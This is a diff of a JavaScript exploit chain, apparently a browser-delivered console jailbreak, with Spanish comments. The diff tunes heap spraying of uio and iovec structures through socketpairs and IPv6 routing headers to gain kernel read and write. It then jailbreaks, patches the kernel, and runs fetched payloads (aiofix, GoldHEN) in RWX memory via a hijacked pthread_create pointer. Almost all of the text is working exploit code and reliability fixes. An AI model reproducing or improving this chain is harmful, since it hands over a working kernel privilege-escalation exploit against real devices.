@@ -1,4 +1,4 @@
-// chain_poops_v6.js — fix de SO_SNDBUF grande + aiofix + GoldHEN
+// chain_poops_v6.js — fix O_NONBLOCK en socketpair para evitar deadlock en landUio
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -18,7 +18,7 @@ const CFG_IOV_WORKERS   = 1;
 const CFG_UIO_WORKERS   = 1;
 const CFG_ATTEMPTS      = 4;
 const CFG_MSDELAY       = 2;
-const CFG_USE_REALTIME  = 1;
+const CFG_USE_REALTIME  = 0;
 const CFG_USE_PAIR      = 0;
 const CFG_VERBOSE       = 1;
 
@@ -26,11 +26,11 @@ const CFG_DO_MAKE_KARW  = 1;
 const CFG_DO_JAILBREAK  = 1;
 const CFG_DO_KPATCH     = 1;
 const CFG_DO_PAYLOAD    = 1;
-
-// *** FIX: SO_SNDBUF grande para que writev no bloquee ***
-const CFG_SOCK_BUF      = 0x4000;   // 16 KB, era `size` antes
 // ============================================================
 
+// ============================================================
+// TELEMETRÍA
+// ============================================================
 const TM = window.__TM = window.__TM || {
     startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
 };
@@ -121,7 +121,7 @@ const KQ_BATCH = 8;
 const KQ_HDR_MAGIC = 0x1430000;
 
 const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
-const NUM_UIO_SPRAY = 512;
+const NUM_UIO_SPRAY = 512;                    // *** reducido de 10000 a 512 ***
 const NUM_IOV_SPRAY_MAX = 100000;
 const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
 const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
@@ -181,11 +181,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
             + " rtp=" + CFG_USE_REALTIME + " pair=" + CFG_USE_PAIR
             + " karw=" + CFG_DO_MAKE_KARW + " jb=" + CFG_DO_JAILBREAK
-            + " kp=" + CFG_DO_KPATCH + " pl=" + CFG_DO_PAYLOAD
-            + " sockbuf=0x" + CFG_SOCK_BUF.toString(16));
+            + " kp=" + CFG_DO_KPATCH + " pl=" + CFG_DO_PAYLOAD);
 
         tmDiag('fw_key', key);
 
+        // ============ CARGAR aiofix Y payload ============
         let kpatch = null, aiofix = null, payload = null;
         const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
             : key ? "patches/" + key.replace(".", "") + ".bin" : null;
@@ -207,7 +207,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");
 
         try {
-            const r = await fetch("aiofix.bin");
+            const r = await fetch("afix1.bin");
             if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("AIOFIX-FETCH-THREW", e.message); }
         mark("AIOFIX-BLOB", aiofix
@@ -219,6 +219,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
         mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " magic=" + (payload[0] === 0xe9 ? "e9-jmp" : (payload[0] === 0x7f ? "ELF" : "0x" + payload[0].toString(16))) : "MISSING");
+
+        tmDiag('aiofix_len', aiofix ? aiofix.length : 0);
+        tmDiag('payload_len', payload ? payload.length : 0);
 
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
@@ -390,8 +393,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
 
-        // *** FIX: scratchAb más grande para soportar preloads ***
-        const scratchAb = new ArrayBuffer(0x8000); keepAlive.push(scratchAb);
+        const scratchAb = new ArrayBuffer(0x2000); keepAlive.push(scratchAb);  // *** 0x1000 -> 0x2000 ***
         const scratch = bufAddr(scratchAb);
         const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
         const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
@@ -459,7 +461,13 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
+
+        // *** FIX v6: O_NONBLOCK en ambos extremos del uio socketpair ***
+        // Esto evita deadlock cuando writev/read bloquean en landUio
+        const uioNbioRc0 = sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK).i32;
+        const uioNbioRc1 = sc(SYS.fcntl, uioSs[1], F_SETFL, O_NONBLOCK).i32;
+        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",")
+            + " O_NONBLOCK rc=" + uioNbioRc0 + "," + uioNbioRc1);
 
         if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
         const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -898,26 +906,32 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         function tripletsUsable() {
             return triplets && triplets.length === 3 && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
         }
-
-        // *** FIX: landUio con try/catch, drain y yield ***
         async function landUio(size, forWrite, tasks) {
             if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets=" + triplets.join(",")); return null; }
-            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev") + " size=" + size);
             freeRthdr(triplets[2]);
             const uioDeadline = Date.now() + (params.has("uioms") ? parseInt(params.get("uioms"), 10) : 60000);
+
+            // *** FIX v6: cuántos bytes escribir/leer para vaciar el socketpair ***
+            const wakeBytes = Math.min(size * NUM_UIO_IOV, 0x800);
+
             for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                 if ((i & 0x3f) === 0 && Date.now() > uioDeadline) { mark("UIO-LAND-TIMEOUT", "rounds=" + i); break; }
                 if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
-                for (let k = 0; k < uioWorkers.length; ++k)
-                    tasks[k] = fireW(uioWorkers[k], forWrite ? SYS.readv : SYS.writev, [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
+                for (let k = 0; k < uioWorkers.length; ++k) tasks[k] = fireW(uioWorkers[k], forWrite ? SYS.readv : SYS.writev, [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                 sc(SYS.sched_yield);
                 if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV)
                     return new int64(leakDv.getUint32(0, true), leakDv.getUint32(4, true));
-                if (forWrite) { for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], scratch, size); }
-                else { sc(SYS.read, uioSs[0], scratch, size); for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.read, uioSs[0], scratch, size); }
+                // *** FIX v6: wake con wakeBytes (no size) ***
+                if (forWrite) {
+                    for (let k = 0; k < uioWorkers.length; ++k)
+                        sc(SYS.write, uioSs[1], scratch, wakeBytes);
+                } else {
+                    for (let k = 0; k < uioWorkers.length; ++k)
+                        sc(SYS.read, uioSs[0], scratch, wakeBytes);
+                }
                 try { await Promise.all(tasks); } catch (_) { }
-                for (let k = 0; k < uioWorkers.length; ++k) { try { sc(SYS.read, uioSs[0], scratch, 4); } catch (_) { } }
-                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
+                // *** FIX v6: drain extra ***
+                if (!forWrite) sc(SYS.write, uioSs[1], scratch, wakeBytes);
                 if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
             }
             return null;
@@ -933,9 +947,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 sc(SYS.sched_yield);
                 if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-                await Promise.all(tasks);
+                try { await Promise.all(tasks); } catch (_) { }
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
-                if ((i & 0x3f) === 0x3f) await new Promise(r => setTimeout(r, 0));
             }
             return false;
         }
@@ -994,13 +1007,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 new Uint8Array(ab).fill(0x41);
                 return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
             });
-            // *** FIX: SO_SNDBUF y SO_RCVBUF grandes, no `size` ***
-            lenDv.setUint32(0, CFG_SOCK_BUF, true);
+            const BIGBUF = 0x4000;
+            lenDv.setUint32(0, BIGBUF, true);
             sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
             sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
-            // *** FIX: preload acotado ***
-            const preload = Math.min(size * (uioWorkers.length + 4), 0x800);
-            sc(SYS.write, uioSs[1], scratch, preload);
+            sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
             const uioIov = await landUio(size, false, utasks);
@@ -1011,7 +1022,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const itasks = new Array(iovWorkers.length);
             const ok = await landFakeUio(itasks);
             if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return null; }
-            sc(SYS.read, uioSs[0], scratch, size);
+            sc(SYS.read, uioSs[0], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
             let got = null, drained = 0;
             for (const b of bufs) {
                 sc(SYS.read, uioSs[0], b.addr, size);
@@ -1028,13 +1039,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
             if (!tripletsUsable()) { mark("KWRITE-REFUSED", "triplets=" + triplets.join(",")); return false; }
             mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
-            // *** FIX: SO_SNDBUF y SO_RCVBUF grandes, no `size` ***
-            lenDv.setUint32(0, CFG_SOCK_BUF, true);
+            const BIGBUF = 0x4000;
+            lenDv.setUint32(0, BIGBUF, true);
             sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
             sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
-            // *** FIX: preload acotado ***
-            const preload = Math.min(size * (uioWorkers.length + 4), 0x800);
-            sc(SYS.write, uioSs[1], scratch, preload);
+            sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
             const uioIov = await landUio(size, true, utasks);
@@ -1051,9 +1060,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             return true;
         }
 
-        // ============================================================
-        // make_karw: pipes
-        // ============================================================
         if (kernelBase && triplets) {
             const KREAD_TRIES = params.has("kreadtries") ? parseInt(params.get("kreadtries"), 10) : 4;
             async function kread8(a) {
@@ -1300,27 +1306,22 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         }
                     } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
 
-                    // PAYLOAD EN DOS ETAPAS
+                    // PAYLOAD en dos etapas
                     let payloadRunning = false;
                     let aiofixRan = false;
 
                     if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
-
-                        // ETAPA 1: aiofix
                         if (aiofix && aiofix.length > 0) {
                             state("running aiofix...", "warn");
                             const asz = (aiofix.length + 0x3fff) & ~0x3fff;
                             const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
                             const aEntry = new int64(am.lo, am.hi);
                             mark("AIOFIX-MAP", "size=0x" + asz.toString(16) + " rwx=" + aEntry);
-
                             if (aEntry.hi > 0) {
                                 for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
                                 let aBad = -1;
-                                for (let i = 0; i < aiofix.length; ++i)
-                                    if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
+                                for (let i = 0; i < aiofix.length; ++i) if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
                                 check("aiofix-byte-rwx-memory", aBad < 0, aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
-
                                 if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
                                     const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                     const fn = p.read8(slot);
@@ -1345,21 +1346,17 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                             mark("AIOFIX-SKIPPED", "no aiofix cargado");
                         }
 
-                        // ETAPA 2: GoldHEN
                         if (payload) {
                             state("running GoldHEN payload...", "warn");
                             const sz = (payload.length + 0x3fff) & ~0x3fff;
                             const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                             const entry = new int64(m.lo, m.hi);
                             mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
-
                             if (entry.hi > 0) {
                                 for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
                                 let bad = -1;
-                                for (let i = 0; i < payload.length; ++i)
-                                    if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
+                                for (let i = 0; i < payload.length; ++i) if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                                 check("byte-payload-rwx-memory", bad < 0, bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
-
                                 if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                     const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                     const fn = p.read8(slot);
@@ -1382,9 +1379,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         }
                     }
 
-                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
-                        + " kpatched=" + kpatched + " aiofix=" + aiofixRan + " payload=" + payloadRunning);
-
+                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " aiofix=" + aiofixRan + " payload=" + payloadRunning);
                     if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 aiofix=" + aiofixRan + " payload=1"); }
                     else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
                     else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=0");
